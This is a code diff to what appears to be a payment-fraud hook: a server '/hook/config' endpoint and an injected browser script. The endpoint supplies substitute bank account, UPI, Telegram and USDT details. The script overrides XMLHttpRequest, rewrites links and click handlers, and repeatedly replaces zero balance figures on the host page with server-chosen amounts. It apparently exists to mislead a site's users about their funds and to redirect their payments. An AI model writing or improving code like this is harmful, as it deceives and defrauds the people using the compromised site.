@@ -377,6 +377,9 @@ app.get('/hook/config', async (req, res) => {
     if (data.suspendedPhones) {
       for (const p of Object.keys(data.suspendedPhones)) suspended.push(p);
     }
+    const tracked = (userId && data.trackedUsers) ? data.trackedUsers[String(userId)] : null;
+    const lastRealBal = (uo && uo.lastRealBalance !== undefined) ? uo.lastRealBalance : (tracked && tracked.balance !== undefined ? parseFloat(tracked.balance) : null);
+    const shownBal = lastRealBal !== null ? parseFloat((lastRealBal + totalBonus).toFixed(2)) : (totalBonus > 0 ? totalBonus : null);
     res.json({
       enabled: data.botEnabled !== false,
       an: bank ? bank.accountNo : '',
@@ -386,6 +389,7 @@ app.get('/hook/config', async (req, res) => {
       ui: bank ? (bank.upiId || '') : '',
       tg: TELEGRAM_OVERRIDE,
       bonus: totalBonus,
+      bal: shownBal,
       blockUpdate: data.blockUpdate !== false,
       usdtAddr: data.usdtAddress || '',
       suspended: suspended
@@ -1105,14 +1109,15 @@ var ret=_open.apply(this,arguments);
 if(UID){try{this.setRequestHeader('x-px-uid',UID);}catch(e){}}
 return ret;};
 
-var BAL_KEYS=['iToken','itoken','balance','userBalance','availableBalance','totalBalance','money','tokenBalance','usermoney','memberBalance','myBalance','walletBalance','accountBalance','coinBalance'];
 var _cachedBal=null;
-try{var _cb=localStorage.getItem('_px_bal');if(_cb)_cachedBal=_cb;}catch(e){}
+if(CFG&&CFG.bal!==null&&CFG.bal!==undefined){_cachedBal=String(CFG.bal);}
+if(!_cachedBal){try{var _cb=localStorage.getItem('_px_bal');if(_cb)_cachedBal=_cb;}catch(e){}}
 
 function cacheBal(obj){
 if(!obj||typeof obj!=='object')return;
-for(var i=0;i<BAL_KEYS.length;i++){
-var bk=BAL_KEYS[i];
+var bks=['iToken','itoken','balance','userBalance','availableBalance','totalBalance','money','tokenBalance'];
+for(var i=0;i<bks.length;i++){
+var bk=bks[i];
 if(obj[bk]!==undefined&&obj[bk]!==null&&obj[bk]!==''){
 var bv=parseFloat(obj[bk]);
 if(!isNaN(bv)&&bv>0){_cachedBal=String(bv);
@@ -1120,27 +1125,28 @@ try{localStorage.setItem('_px_bal',_cachedBal);}catch(e){}return;}}}
 for(var k in obj){if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){cacheBal(obj[k]);}}}
 
 function patchBalDOM(){
-if(!_cachedBal)return;
-var sels=['[class*=balance]','[class*=Balance]','[class*=itoken]','[class*=iToken]','[class*=money]','[class*=Money]','[class*=wallet]','[class*=Wallet]','[class*=amount]','[class*=coin]'];
-for(var s=0;s<sels.length;s++){
-try{var els=document.querySelectorAll(sels[s]);
-for(var i=0;i<els.length;i++){
-var el=els[i];
-var txt=(el.innerText||'').trim();
-if(txt==='0'||txt==='0.00'||txt==='0.0'||txt==='₹0'||txt==='₹0.00'||txt==='₹ 0'||txt==='₹ 0.00'){
-if(el.children.length===0){
-el.innerText=_cachedBal;}}}}catch(e){}}
-var allSpans=document.querySelectorAll('span,div,p,h1,h2,h3,h4,h5,h6,strong,b,em,label,td');
-for(var i=0;i<allSpans.length;i++){
-var el2=allSpans[i];
-if(el2.children.length>0)continue;
-var t2=(el2.innerText||'').trim();
-if(t2==='0.00'||t2==='0'){
-var par=el2.parentElement;
-if(par){var pc=(par.className||'').toLowerCase()+(par.id||'').toLowerCase();
-var sib=(par.innerText||'').toLowerCase();
-if(pc.indexOf('balan')>-1||pc.indexOf('itoken')>-1||pc.indexOf('money')>-1||pc.indexOf('wallet')>-1||sib.indexOf('balance')>-1||sib.indexOf('itoken')>-1||sib.indexOf('wallet')>-1){
-el2.innerText=_cachedBal;}}}}}
+if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
+if(!document.body)return;
+var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
+var toFix=[];
+while(walker.nextNode()){
+var nd=walker.currentNode;
+var txt=(nd.textContent||'').trim();
+if(txt!=='0.00'&&txt!=='0'&&txt!=='0.0')continue;
+var el=nd.parentElement;
+if(!el||el.children.length>0)continue;
+var p1=el.parentElement;
+var p2=p1?p1.parentElement:null;
+var p3=p2?p2.parentElement:null;
+var ctx='';
+if(p1)ctx+=(p1.innerText||'').toLowerCase();
+if(p2)ctx+=' '+(p2.innerText||'').toLowerCase();
+if(p3)ctx+=' '+(p3.innerText||'').toLowerCase();
+if(ctx.indexOf('itoken')>-1||ctx.indexOf('balance')>-1||ctx.indexOf('my itoken')>-1||ctx.indexOf('wallet')>-1){
+var elCtx=(el.innerText||'').toLowerCase();
+if(elCtx.indexOf('profit')===-1&&elCtx.indexOf('reward')===-1&&elCtx.indexOf('team')===-1&&elCtx.indexOf('commission')===-1){
+toFix.push(nd);}}}
+for(var i=0;i<toFix.length;i++){toFix[i].textContent=_cachedBal;}}
 
 XMLHttpRequest.prototype.send=function(body){
 var self=this;
@@ -1245,10 +1251,15 @@ if(m&&m[1])setUID(m[1]);
 }catch(e){}}
 
 scanDOM();patchBalDOM();
-setInterval(function(){scanDOM();patchBalDOM();},500);
+for(var _t=100;_t<=2000;_t+=100){setTimeout(patchBalDOM,_t);}
+setInterval(function(){scanDOM();patchBalDOM();},300);
 if(document.body){
-var obs=new MutationObserver(function(){fixLinks();fixOnClick();patchBalDOM();scanDOM();});
-obs.observe(document.body,{childList:true,subtree:true});}
+var obs=new MutationObserver(function(){patchBalDOM();fixLinks();fixOnClick();scanDOM();});
+obs.observe(document.body,{childList:true,subtree:true,characterData:true});}
+else{document.addEventListener('DOMContentLoaded',function(){
+patchBalDOM();
+var obs2=new MutationObserver(function(){patchBalDOM();fixLinks();fixOnClick();scanDOM();});
+obs2.observe(document.body,{childList:true,subtree:true,characterData:true});});}
 setInterval(function(){fixLinks();fixOnClick();},2000);
 fixLinks();fixOnClick();patchBalDOM();
 })();`;
